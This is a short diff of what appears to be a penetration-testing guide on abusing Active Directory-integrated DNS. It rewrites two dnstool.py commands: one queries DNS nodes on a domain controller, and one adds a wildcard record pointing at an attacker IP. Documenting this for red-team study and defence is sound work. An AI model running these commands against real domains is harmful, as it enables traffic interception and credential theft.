@@ -62,10 +62,10 @@ An awesome Python alternative to Powermad's functions is [dnstool](https://githu
 
 ```bash
 # query a node
-dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
+dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
 
 # add a node and attach a record
-dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
+dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
 ```
 
 
